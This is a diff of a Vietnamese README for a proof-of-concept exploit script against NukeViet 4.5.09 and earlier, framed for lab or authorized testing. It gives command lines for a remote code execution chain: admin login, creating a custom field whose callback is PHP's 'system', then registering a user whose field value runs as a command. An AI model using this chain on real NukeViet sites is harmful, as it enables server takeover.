@@ -1,8 +1,37 @@
-## Cách sử dụng
+## 🚀 Cách sử dụng
 
-Tool hỗ trợ 4 chức năng chính:
+> ⚠️ **Phạm vi ảnh hưởng:** Lỗ hổng hiện được xác nhận trên **NukeViet `<= 4.5.09`**.
+> PoC này chỉ dành cho **môi trường Lab hoặc hệ thống được ủy quyền kiểm thử**.
 
-### 1. Đăng nhập Admin
+### 🔎 Luồng kiểm thử
+
+```text
+┌──────────────────────┐
+│  1. Đăng nhập Admin  │
+└──────────┬───────────┘
+           │
+           ▼
+┌──────────────────────┐
+│ 2. Tạo Custom Field  │
+│   callback = system  │
+└──────────┬───────────┘
+           │
+           ▼
+┌──────────────────────┐
+│ 3. Đăng ký tài khoản  │
+│  custom_field = id   │
+└──────────┬───────────┘
+           │
+           ▼
+┌──────────────────────┐
+│ 4. Kiểm tra Response │
+│      → RCE PoC       │
+└──────────────────────┘
+```
+
+---
+
+### ① 🔐 Đăng nhập Admin
 
 ```bash
 python3 exploit.py \
@@ -11,29 +40,15 @@ python3 exploit.py \
   --password 'MậtKhẩuAdmin'
 ```
 
-| Tham số      | Bắt buộc | Mô tả                                          |
-| ------------ | -------- | ---------------------------------------------- |
-| `--url`      | Không    | URL NukeViet, mặc định `http://localhost:8080` |
-| `--user`     | Có       | Tài khoản Admin                                |
-| `--password` | Có       | Mật khẩu Admin                                 |
+* `--url` — URL NukeViet, mặc định `http://localhost:8080`
+* `--user` — tài khoản Admin
+* `--password` — mật khẩu Admin
 
-Session sau khi đăng nhập được lưu vào `admin_session.cookies`.
+Session được lưu vào `admin_session.cookies`.
 
 ---
 
-### 2. Kiểm tra Session Admin
-
-```bash
-python3 exploit.py \
-  --url http://localhost:8080 \
-  --whoami
-```
-
-Kiểm tra `admin_session.cookies` còn hiệu lực hay không.
-
----
-
-### 3. Tạo Custom Field
+### ② 🧩 Tạo Custom Field
 
 ```bash
 python3 exploit.py \
@@ -41,16 +56,12 @@ python3 exploit.py \
   --test-field nv_poc_rce
 ```
 
-| Tham số        | Bắt buộc | Mô tả                    |
-| -------------- | -------- | ------------------------ |
-| `--test-field` | Có       | Tên custom field cần tạo |
-| `--url`        | Không    | URL NukeViet             |
-
-Field được tạo với `match_type=callback` và callback `system`.
+* `--test-field` — tên Custom Field cần tạo.
+* Script tự cấu hình field với `match_type=callback` và callback `system`.
 
 ---
 
-### 4. Kích hoạt PoC qua đăng ký
+### ③ 💥 Kích hoạt PoC
 
 ```bash
 python3 exploit.py \
@@ -59,16 +70,18 @@ python3 exploit.py \
   --reg-field 'nv_poc_rce=id'
 ```
 
-| Tham số       | Bắt buộc | Mô tả                                 |
-| ------------- | -------- | ------------------------------------- |
-| `--register`  | Có       | Thực hiện đăng ký user                |
-| `--reg-field` | Có       | Custom field theo dạng `NAME=VALUE`   |
-| `--reg-user`  | Không    | Username test, mặc định tự sinh       |
-| `--reg-email` | Không    | Email test, mặc định tự sinh          |
-| `--reg-pass`  | Không    | Mật khẩu, mặc định `Password123@!`    |
-| `--config`    | Không    | Đường dẫn `config.php` để đọc sitekey |
+Các tham số:
 
-Ví dụ:
+| Tham số       | Mô tả                               |
+| ------------- | ----------------------------------- |
+| `--register`  | Thực hiện đăng ký tài khoản test    |
+| `--reg-field` | Custom Field theo dạng `NAME=VALUE` |
+| `--reg-user`  | Username test, mặc định tự sinh     |
+| `--reg-email` | Email test, mặc định tự sinh        |
+| `--reg-pass`  | Mật khẩu test                       |
+| `--config`    | Đường dẫn tới `config.php`          |
+
+Ví dụ đầy đủ:
 
 ```bash
 python3 exploit.py \
@@ -80,4 +93,22 @@ python3 exploit.py \
   --reg-field 'nv_poc_rce=id'
 ```
 
-> **Lưu ý:** Chỉ sử dụng tool trên hệ thống NukeViet thuộc quyền kiểm thử của bạn hoặc môi trường lab được cấp phép.
+---
+
+### ④ 👤 Kiểm tra Session
+
+```bash
+python3 exploit.py \
+  --url http://localhost:8080 \
+  --whoami
+```
+
+Kiểm tra `admin_session.cookies` còn hiệu lực hay không.
+
+---
+
+### 📌 Lưu ý
+
+* **Affected versions:** `NukeViet <= 4.5.09`
+* PoC được thiết kế cho môi trường **Lab / Authorized Pentest**.
+* Không commit `admin_session.cookies` hoặc `config.php` chứa thông tin nhạy cảm lên repository.
